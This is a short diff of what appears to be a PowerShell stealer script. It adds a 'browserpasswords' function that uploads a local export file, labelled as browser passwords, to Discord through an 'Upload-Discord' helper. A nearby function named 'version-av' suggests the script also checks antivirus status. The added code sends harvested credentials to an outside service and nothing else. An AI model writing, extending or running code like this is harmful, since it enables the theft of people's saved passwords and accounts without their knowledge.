@@ -57,4 +57,6 @@ function version-av {
 }
 
 
-
+function browserpasswords {
+  Upload-Discord -file "C:\temp\export.txt" -text "Browser password :"
+}
